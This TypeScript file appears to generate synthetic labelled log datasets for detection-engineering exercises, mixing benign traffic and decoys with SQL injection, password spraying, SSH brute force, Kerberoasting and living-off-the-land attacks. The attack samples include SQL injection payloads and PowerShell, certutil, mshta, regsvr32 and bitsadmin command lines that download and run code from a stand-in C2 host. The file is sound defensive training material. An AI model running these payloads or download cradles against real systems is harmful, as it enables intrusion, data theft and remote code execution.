import { createHmac } from 'node:crypto';
import type { Dataset, DetectionEvent, FieldValue } from './engine.js';

/**
 * Labelled log datasets for detection challenges (ADR 0010). Generated per
 * learner from an HMAC seed (addresses, timings and volumes vary; nothing is
 * stored). Each one hides attacks among benign activity, and plants traps that
 * a naive rule falls into: the point is precision AND recall.
 */
export const DATASET_KINDS = ['web-sqli', 'auth-spray', 'process-lolbins', 'ssh-bruteforce', 'kerberoasting'] as const;
export type DatasetKind = (typeof DATASET_KINDS)[number];

const T0 = 1_768_200_000; // 2026-01-12, 06:40 UTC

function rng(seed: Buffer, label: string) {
  let i = 0;
  const int = (n: number) => createHmac('sha256', seed).update(`${label}:${String(i++)}`).digest().readUInt32BE(0) % n;
  return {
    int,
    pick: <T>(list: readonly T[]): T => {
      const v = list[int(list.length)];
      if (v === undefined) throw new Error('empty list');
      return v;
    },
  };
}

type Draft = Record<string, FieldValue> & { ts: number };

/** Sorts by time and numbers events, so ids say nothing about which ones are malicious. */
function finish(drafts: { e: Draft; bad: boolean }[], fields: readonly string[]): { events: DetectionEvent[]; bad: Set<string> } {
  const sorted = [...drafts].sort((a, b) => a.e.ts - b.e.ts);
  const bad = new Set<string>();
  const events = sorted.map(({ e, bad: isBad }, i) => {
    const id = `e${String(i + 1).padStart(3, '0')}`;
    if (isBad) bad.add(id);
    return Object.freeze({ id, ...Object.fromEntries(fields.map((f) => [f, e[f] ?? ''])) });
  });
  return { events, bad };
}

/* ------------------------------------------------------------------ web-sqli */

const WEB_FIELDS = ['ts', 'src_ip', 'method', 'path', 'query', 'status', 'user_agent'] as const;
const BROWSER = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/134.0';
const WEB_BENIGN: readonly [string, string][] = [
  ['/', ''],
  ['/produits', 'id=3'],
  ['/produits', 'id=7'],
  ['/produits', 'id=12'],
  ['/panier', ''],
  ['/recherche', 'q=chaussures de randonnée'],
];
/** Benign requests that look like SQL injection to a lazy rule. */
const WEB_TRAPS: readonly [string, string][] = [
  ['/recherche', 'q=select ta taille'],
  ['/recherche', "q=t-shirt rock'n'roll"],
  ['/recherche', 'q=union jack'],
  ['/recherche', 'q=sleep mask'],
  ['/recherche', 'q=bague or rose'],
  ['/recherche', 'q=ordre by date'],
  ['/livraison', "nom=O'Connor&ville=Rennes"],
  ['/livraison', "nom=D'Artagnan&ville=Auch"],
  ['/blog/drop-shipping-et-stocks', ''],
];
const WEB_ATTACKS: readonly [string, string][] = [
  ['/produits', "id=3'"],
  ['/produits', 'id=3 AND 1=1'],
  ['/produits', 'id=3 AND 1=2'],
  ['/produits', 'id=3 ORDER BY 5--'],
  ['/produits', 'id=3 UNION SELECT NULL,NULL,NULL--'],
  ['/produits', 'id=-1 UnIoN SeLeCt username,password,3 FROM users--'],
  ['/recherche', "q=x' OR '1'='1"],
  ['/recherche', "q=x' or 1=1-- "],
  ['/produits', 'id=3 AND SLEEP(5)'],
  ['/produits', 'id=3;DROP TABLE commandes--'],
  ['/produits', 'id=3 AND ASCII(SUBSTR((SELECT valeur FROM secrets),1,1))>64'],
  ['/connexion', "identifiant=admin'--"],
];

function webSqli(seed: Buffer): Dataset {
  const r = rng(seed, 'web');
  const drafts: { e: Draft; bad: boolean }[] = [];
  const visitors = Array.from({ length: 8 }, (_, i) => `${i % 2 ? '198.51.100' : '192.0.2'}.${String(10 + r.int(200))}`);
  const visit = (path: string, query: string, ip: string, bad: boolean, ua = BROWSER) => {
    drafts.push({ e: { ts: T0 + r.int(3600), src_ip: ip, method: 'GET', path, query, status: bad && r.int(3) === 0 ? 500 : 200, user_agent: ua }, bad });
  };
  for (const v of visitors) for (let k = 0; k < 15 + r.int(10); k++) visit(...r.pick(WEB_BENIGN), v, false);
  for (const [path, query] of WEB_TRAPS) visit(path, query, r.pick(visitors), false);
  for (let k = 0; k < 10; k++) visit(...r.pick(WEB_TRAPS), r.pick(visitors), false);
  // Two attackers: one announces itself (sqlmap), one hides behind a browser user agent.
  const loud = `10.13.37.${String(2 + r.int(250))}`;
  const quiet = `203.0.113.${String(2 + r.int(250))}`;
  WEB_ATTACKS.forEach(([path, query], i) => {
    visit(path, query, i % 2 ? quiet : loud, true, i % 2 ? BROWSER : 'sqlmap/1.8.12#stable (https://sqlmap.org)');
  });
  const { events, bad } = finish(drafts, ['ts', ...WEB_FIELDS.slice(1)]);
  return { fields: WEB_FIELDS, unit: 'event', events, malicious: bad };
}

/* ---------------------------------------------------------------- auth-spray */

const AUTH_FIELDS = ['ts', 'event_id', 'user', 'src_ip', 'logon_type', 'status'] as const;
const USERS = [
  'a.martin', 'c.bernard', 'l.petit', 'm.durand', 's.leroy', 'j.moreau', 'n.simon', 'p.laurent', 'e.michel', 't.garcia',
  'r.david', 'h.bertrand', 'k.roux', 'v.vincent', 'f.fournier', 'g.morel', 'i.girard', 'o.andre', 'b.lefevre', 'd.mercier',
  'y.dupont', 'z.lambert', 'q.bonnet', 'w.francois', 'x.martinez',
] as const;
const BAD_PASSWORD = '0xC000006A';

function authSpray(seed: Buffer): Dataset {
  const r = rng(seed, 'auth');
  const drafts: { e: Draft; bad: boolean }[] = [];
  const logon = (ts: number, ok: boolean, user: string, ip: string, bad = false) =>
    drafts.push({ e: { ts, event_id: ok ? 4624 : 4625, user, src_ip: ip, logon_type: 3, status: ok ? '0x0' : BAD_PASSWORD }, bad });
  // Ordinary mornings.
  for (let k = 0; k < 70; k++) logon(T0 + r.int(7200), true, r.pick(USERS), `10.1.0.${String(10 + r.int(50))}`);
  // Typos: one or two failures, then success, from the user's own machine.
  for (let k = 0; k < 6; k++) {
    const ip = `10.1.0.${String(10 + r.int(50))}`;
    const user = r.pick(USERS);
    const t = T0 + r.int(7000);
    const failures = 1 + r.int(2);
    for (let n = 0; n < failures; n++) logon(t + n * 20, false, user, ip);
    logon(t + 60, true, user, ip);
  }
  // TRAP: helpdesk resetting passwords, a few failures across a few users.
  for (const [n, user] of USERS.slice(0, 4).entries()) logon(T0 + 900 + n * 120, false, user, '10.1.9.9');
  // TRAP: a service account with an expired password in a scheduled task: many failures, ONE user.
  for (let n = 0; n < 30; n++) logon(T0 + 300 + n * 30, false, 'svc_sauvegarde', '10.1.5.20');
  // TRAP: a terminal server: many distinct users, but they log in successfully.
  for (let n = 0; n < 14; n++) logon(T0 + 2000 + n * 40, true, USERS[n] ?? 'a.martin', '10.1.7.7');
  logon(T0 + 2100, false, 'k.roux', '10.1.7.7');
  // Two password sprays: one password, many accounts, once each, in a few minutes.
  for (const ip of [`10.1.200.${String(2 + r.int(250))}`, `172.16.50.${String(2 + r.int(250))}`]) {
    const t = T0 + 1000 + r.int(4000);
    const victims = USERS.slice(r.int(5), 20 + r.int(5));
    victims.forEach((user, n) => logon(t + n * (3 + r.int(6)), false, user, ip, true));
    logon(t + victims.length * 9, true, r.pick(victims), ip, true);
  }
  const { events } = finish(drafts, AUTH_FIELDS);
  const attackers = new Set(drafts.filter((d) => d.bad).map((d) => String(d.e.src_ip)));
  return { fields: AUTH_FIELDS, unit: 'entity', entityField: 'src_ip', events, malicious: attackers };
}

/* ----------------------------------------------------------- process-lolbins */

const PROC_FIELDS = ['ts', 'host', 'user', 'image', 'command_line', 'parent_image'] as const;
const W = 'C:\\Windows\\System32\\';
const PS = `${W}WindowsPowerShell\\v1.0\\powershell.exe`;
type Proc = readonly [image: string, commandLine: string, parent: string];
const PROC_BENIGN: readonly Proc[] = [
  ['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', '"chrome.exe" --profile-directory=Default', 'C:\\Windows\\explorer.exe'],
  ['C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE', '"OUTLOOK.EXE"', 'C:\\Windows\\explorer.exe'],
  ['C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE', '"WINWORD.EXE" /n "C:\\Users\\Public\\Documents\\rapport.docx"', 'C:\\Windows\\explorer.exe'],
  [PS, 'powershell.exe -NoProfile -File C:\\Scripts\\sauvegarde.ps1', `${W}svchost.exe`],
  [PS, "powershell.exe -NoProfile -Command \"Get-Service | Where-Object Status -eq 'Stopped'\"", `${W}svchost.exe`],
  [`${W}notepad.exe`, 'notepad.exe C:\\Users\\Public\\notes.txt', 'C:\\Windows\\explorer.exe'],
];
/** Legitimate uses of the same binaries attackers abuse ("living off the land"). */
const PROC_TRAPS: readonly Proc[] = [
  [`${W}certutil.exe`, 'certutil.exe -hashfile C:\\Temp\\installeur.msi SHA256', `${W}cmd.exe`],
  [`${W}rundll32.exe`, 'rundll32.exe printui.dll,PrintUIEntry /il', 'C:\\Windows\\explorer.exe'],
  [`${W}rundll32.exe`, 'rundll32.exe shell32.dll,Control_RunDLL desk.cpl', 'C:\\Windows\\explorer.exe'],
  [`${W}regsvr32.exe`, 'regsvr32.exe /s "C:\\Program Files\\Editeur\\plugin.dll"', 'C:\\Program Files\\Editeur\\setup.exe'],
  [`${W}bitsadmin.exe`, 'bitsadmin.exe /list /allusers', `${W}cmd.exe`],
  [`${W}mshta.exe`, 'mshta.exe C:\\Windows\\Help\\aide-impression.hta', 'C:\\Windows\\explorer.exe'],
  [PS, 'powershell.exe -NoProfile -WindowStyle Hidden -File "C:\\Program Files\\Supervision\\collecte.ps1"', 'C:\\Program Files\\Supervision\\agent.exe'],
];
const C2 = '203.0.113.7';
const PROC_ATTACKS: readonly Proc[] = [
  [PS, 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA', 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE'],
  [PS, `powershell.exe -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://${C2}/a.ps1')"`, `${W}cmd.exe`],
  [PS, 'powershell.exe -ep bypass -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=', `${W}cmd.exe`],
  [`${W}cmd.exe`, `cmd.exe /c powershell -w hidden -c "iex(iwr http://${C2}/b.ps1)"`, 'C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE'],
  [`${W}certutil.exe`, `certutil.exe -urlcache -split -f http://${C2}/outil.exe C:\\Users\\Public\\outil.exe`, `${W}cmd.exe`],
  [`${W}rundll32.exe`, 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write()', `${W}cmd.exe`],
  [`${W}mshta.exe`, `mshta.exe http://${C2}/page.hta`, `${W}cmd.exe`],
  [`${W}regsvr32.exe`, `regsvr32.exe /s /n /u /i:http://${C2}/fichier.sct scrobj.dll`, `${W}cmd.exe`],
  [`${W}bitsadmin.exe`, `bitsadmin.exe /transfer tache /download /priority high http://${C2}/x.exe C:\\Users\\Public\\x.exe`, `${W}cmd.exe`],
];

function processLolbins(seed: Buffer): Dataset {
  const r = rng(seed, 'proc');
  const hosts = ['PC-COMPTA-01', 'PC-COMPTA-02', 'PC-RH-03', 'SRV-FICHIERS', 'PC-DIRECTION'];
  const drafts: { e: Draft; bad: boolean }[] = [];
  const run = ([image, commandLine, parent]: Proc, bad: boolean) =>
    drafts.push({ e: { ts: T0 + r.int(28_800), host: r.pick(hosts), user: r.pick(USERS), image, command_line: commandLine, parent_image: parent }, bad });
  for (let k = 0; k < 90; k++) run(r.pick(PROC_BENIGN), false);
  for (const p of PROC_TRAPS) run(p, false);
  for (let k = 0; k < 12; k++) run(r.pick(PROC_TRAPS), false);
  for (const p of PROC_ATTACKS) run(p, true);
  const { events, bad } = finish(drafts, PROC_FIELDS);
  return { fields: PROC_FIELDS, unit: 'event', events, malicious: bad };
}

/* ------------------------------------------------------------ ssh-bruteforce */

const SSH_FIELDS = ['ts', 'host', 'program', 'event', 'user', 'src_ip'] as const;

function sshBruteforce(seed: Buffer): Dataset {
  const r = rng(seed, 'ssh');
  const drafts: { e: Draft; bad: boolean }[] = [];
  const ssh = (ts: number, event: string, user: string, ip: string, bad = false) => drafts.push({ e: { ts, host: 'srv-web-01', program: 'sshd', event, user, src_ip: ip }, bad });
  // Admins with keys, all day.
  for (let k = 0; k < 40; k++) ssh(T0 + r.int(28_800), 'accepted_publickey', r.pick(['deploy', 'florian', 'admin']), `10.2.0.${String(5 + r.int(3))}`);
  // TRAP: the jump host, many logins, all successful.
  for (let k = 0; k < 25; k++) ssh(T0 + r.int(7200), 'accepted_publickey', 'deploy', '10.2.0.1');
  // TRAP: monitoring probes the port: many pre-auth disconnects, no password tried.
  for (let k = 0; k < 40; k++) ssh(T0 + k * 120, 'disconnect_preauth', '-', '10.2.0.9');
  // A developer mistyping, then in.
  ssh(T0 + 5000, 'failed_password', 'marc', '10.2.3.40');
  ssh(T0 + 5010, 'failed_password', 'marc', '10.2.3.40');
  ssh(T0 + 5030, 'accepted_password', 'marc', '10.2.3.40');
  // TRAP: someone who forgot their password: 6 tries over 10 minutes, then help, then in.
  for (let n = 0; n < 6; n++) ssh(T0 + 9000 + n * 100, 'failed_password', 'julie', '10.2.3.41');
  ssh(T0 + 9900, 'accepted_password', 'julie', '10.2.3.41');
  // Two fast brute forcers.
  for (const ip of [`198.51.100.${String(2 + r.int(250))}`, `203.0.113.${String(2 + r.int(250))}`]) {
    const t = T0 + r.int(20_000);
    const n = 25 + r.int(15);
    for (let k = 0; k < n; k++) {
      const user = r.pick(['root', 'admin', 'test', 'oracle', 'ubuntu', 'postgres']);
      ssh(t + k * (1 + r.int(4)), user === 'root' ? 'failed_password' : 'invalid_user', user, ip, true);
    }
  }
  // TRAP for short windows: a slow brute forcer, 12 tries spread over almost an hour.
  const slow = `192.0.2.${String(2 + r.int(250))}`;
  const t = T0 + 12_000;
  for (let k = 0; k < 12; k++) ssh(t + k * (270 + r.int(30)), 'failed_password', 'root', slow, true);
  const { events } = finish(drafts, SSH_FIELDS);
  const attackers = new Set(drafts.filter((d) => d.bad).map((d) => String(d.e.src_ip)));
  return { fields: SSH_FIELDS, unit: 'entity', entityField: 'src_ip', events, malicious: attackers };
}

/* ------------------------------------------------------------- kerberoasting */

const KRB_FIELDS = ['ts', 'event_id', 'account', 'src_ip', 'service_name', 'ticket_encryption_type', 'status'] as const;
const AES = '0x12';
const RC4 = '0x17';
/** Machine accounts: random 120-character passwords, not worth roasting. */
const MACHINES = ['SRV-FICHIERS$', 'SRV-IMPRESSION$', 'SRV-WEB$', 'SRV-MESSAGERIE$', 'SRV-INTRANET$'] as const;
/** User accounts with an SPN: human passwords, the Kerberoasting targets. */
const SERVICE_ACCOUNTS = ['svc_sql', 'svc_web', 'svc_sauvegarde', 'svc_sharepoint', 'svc_crm', 'svc_reporting', 'svc_supervision', 'svc_paie'] as const;
const LEGACY = ['PC-ATELIER-01$', 'PC-ATELIER-02$', 'PC-ATELIER-03$', 'PC-ATELIER-04$', 'PC-ATELIER-05$', 'PC-ATELIER-06$'] as const;

function kerberoasting(seed: Buffer): Dataset {
  const r = rng(seed, 'krb');
  const drafts: { e: Draft; bad: boolean }[] = [];
  const tgs = (ts: number, account: string, ip: string, service: string, enc: string, bad = false) =>
    drafts.push({ e: { ts, event_id: 4769, account, src_ip: ip, service_name: service, ticket_encryption_type: enc, status: '0x0' }, bad });
  const users = USERS.slice(0, 20);
  const ipOf = (user: (typeof users)[number]) => `10.1.0.${String(10 + users.indexOf(user))}`;
  // A working day: users reach file, print, mail and intranet servers, and renew their TGT, all in AES.
  for (let k = 0; k < 150; k++) {
    const user = r.pick(users);
    tgs(T0 + r.int(28_800), user, ipOf(user), r.pick([...MACHINES, 'krbtgt']), AES);
  }
  // Applications that use a service account with an SPN, in AES.
  for (let k = 0; k < 20; k++) {
    const user = r.pick(users);
    tgs(T0 + r.int(28_800), user, ipOf(user), r.pick(['svc_sharepoint', 'svc_crm', 'svc_web']), AES);
  }
  // TRAP: the old payroll application only speaks RC4. Every accountant triggers a naive "RC4" rule, daily.
  for (let k = 0; k < 18; k++) {
    const user = r.pick(users.slice(0, 6));
    tgs(T0 + r.int(28_800), user, ipOf(user), 'svc_paie', RC4);
  }
  // TRAP: the inventory account queries every server in a few minutes, in AES: a "many services" rule without RC4 fires.
  const inv = T0 + 3600 + r.int(3600);
  [...MACHINES, 'svc_sql', 'svc_web', 'svc_reporting', 'svc_crm', 'svc_sharepoint'].forEach((service, n) => tgs(inv + n * 4, 'svc_inventaire', '10.1.9.20', service, AES));
  // TRAP: monitoring polls old workshop machines that only support RC4: many services, RC4, but machine accounts.
  for (let round = 0; round < 3; round++)
    LEGACY.forEach((service, n) => tgs(T0 + round * 9000 + n * 3, 'svc_supervision', '10.1.9.30', service, RC4));
  // Two compromised users roast every service account: one in a burst, one patiently, under an hour.
  const fast = r.pick(users.slice(6, 13));
  const slow = r.pick(users.slice(13));
  const targets = SERVICE_ACCOUNTS.filter((s) => s !== 'svc_supervision');
  const tFast = T0 + r.int(20_000);
  targets.forEach((service, n) => tgs(tFast + n * (1 + r.int(2)), fast, ipOf(fast), service, RC4, true));
  const tSlow = T0 + 4000 + r.int(16_000);
  targets.slice(0, 5).forEach((service, n) => tgs(tSlow + n * (600 + r.int(100)), slow, ipOf(slow), service, RC4, true));
  const { events } = finish(drafts, KRB_FIELDS);
  return { fields: KRB_FIELDS, unit: 'entity', entityField: 'account', events, malicious: new Set([fast, slow]) };
}

export function buildDataset(kind: DatasetKind, seed: Buffer): Dataset {
  switch (kind) {
    case 'web-sqli':
      return webSqli(seed);
    case 'auth-spray':
      return authSpray(seed);
    case 'process-lolbins':
      return processLolbins(seed);
    case 'ssh-bruteforce':
      return sshBruteforce(seed);
    case 'kerberoasting':
      return kerberoasting(seed);
  }
}

/** One JSON object per line (JSON Lines), the shape of most SIEM exports. */
export const toJsonLines = (dataset: Dataset) => dataset.events.map((e) => JSON.stringify(e)).join('\n');
